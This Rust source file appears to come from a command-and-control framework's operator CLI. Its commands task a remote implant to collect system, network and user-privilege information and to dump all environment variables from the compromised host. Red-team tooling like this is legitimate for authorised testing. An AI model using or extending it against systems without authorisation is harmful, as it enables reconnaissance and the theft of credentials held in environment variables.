//! Environment and system information commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Enumerate system information from the implant (OS, hostname, hardware)
pub async fn sysinfo(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Gathering system information...");
    let task = protocol::EnvTask {
        operation: Some(protocol::env_task::Operation::SystemInfo(protocol::GetSystemInfo {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "env", task_data).await?;
    print_success(&format!("Sysinfo task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Enumerate network interfaces and configuration from the implant
pub async fn netinfo(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Gathering network information...");
    let task = protocol::EnvTask {
        operation: Some(protocol::env_task::Operation::NetworkInfo(protocol::GetNetworkInfo {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "env", task_data).await?;
    print_success(&format!("Netinfo task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Dump all environment variables from the implant process
pub async fn envvars(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping environment variables...");
    let task = protocol::EnvTask {
        operation: Some(protocol::env_task::Operation::EnvVars(protocol::GetEnvVars {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "env", task_data).await?;
    print_success(&format!("Envvars task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Get current user identity and privilege information from the implant
pub async fn whoami(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Getting current user identity...");
    let task = protocol::EnvTask {
        operation: Some(protocol::env_task::Operation::Whoami(protocol::WhoAmI {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "env", task_data).await?;
    print_success(&format!("Whoami task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}
